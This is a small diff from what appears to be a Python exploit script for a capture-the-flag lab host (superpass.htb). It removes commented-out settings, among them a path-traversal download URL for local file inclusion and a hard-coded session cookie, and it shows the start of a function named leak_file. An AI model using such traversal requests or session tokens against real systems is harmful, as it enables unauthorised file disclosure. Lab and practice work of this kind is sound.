@@ -4,13 +4,6 @@ import os
 from pathlib import Path
 from argparse import ArgumentParser
 
-# ROOT_DIR = "dump"
-# LFI_URL = "http://superpass.htb/download?fn=../app/app/superpass/"
-# MAIN_FILE = "app.py"
-# HEADERS = {"Cookie": "session=.eJwljrEOwyAMBf-FuQMYY0x-Joqxn9o1aaaq_16kSree7j5pxxnXM23v845H2l-etsThJppzdRL2TAqtpYbG6IAwacuDTH12LsccWo5-zBrmpuzMywWagDoHoVoNABxikqUZQDiyzikxyaIsVmtYK87igYpIa-S-4vzflJy-PygbMQQ.ZB8peQ.6WPsuWzA9fXt4RiCiDYIsIZ-uzs"}
-# PACKAGE_NAME = "superpass"
-# root = Path(Path.cwd() / ROOT_DIR)
-
 
 def leak_file(file_path: str | Path):
     
